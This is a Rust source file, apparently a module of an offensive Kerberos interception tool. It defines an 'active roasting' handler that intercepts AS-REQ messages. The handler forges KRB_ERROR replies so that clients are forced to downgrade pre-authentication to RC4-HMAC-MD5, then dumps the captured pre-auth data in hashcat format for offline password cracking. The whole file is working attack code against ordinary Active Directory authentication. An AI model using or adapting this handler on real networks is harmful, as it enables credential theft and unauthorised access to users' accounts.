use kile::{
    constants::ETYPE_RC4_HMAC_MD5,
    roast::Roastable,
    structures::{AsReqExt, KrbErrorExt},
    KdcFrame,
};
use rasn_kerberos::KrbError;
use tracing::{info, warn};

use super::{Handler, HandlerAction};

#[derive(Clone, Copy)]
pub struct RoastActiveHandler;

impl RoastActiveHandler {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for RoastActiveHandler {
    fn default() -> Self {
        Self {}
    }
}

impl Handler for RoastActiveHandler {
    fn name(&self) -> &'static str {
        "ROAST-ACTIVE"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                Some(ETYPE_RC4_HMAC_MD5) => {
                    info!("Received AS_REQ with RC4_HMAC_MD5 preauth, forwarding to KDC...");
                    if let Ok(hashcat) = as_req.dump_to_hashcat() {
                        info!("Dumped to hashcat: {}", hashcat);
                    } else {
                        warn!("Failed to dump AS_REQ to hashcat format");
                    }
                    HandlerAction::Forward(frame)
                }
                Some(_) => {
                    info!("Received AS_REQ with unwanted preauth etype, forging KRB_ERROR...");
                    let realm = as_req.get_realm();
                    let reply =
                        KrbError::new_preauth_required(realm.to_owned(), ETYPE_RC4_HMAC_MD5);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS_REQ without preauth, forging KRB_ERROR...");
                    let realm = as_req.get_realm();
                    let reply =
                        KrbError::new_preauth_required(realm.to_owned(), ETYPE_RC4_HMAC_MD5);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            _ => HandlerAction::Forward(frame),
        }
    }
}
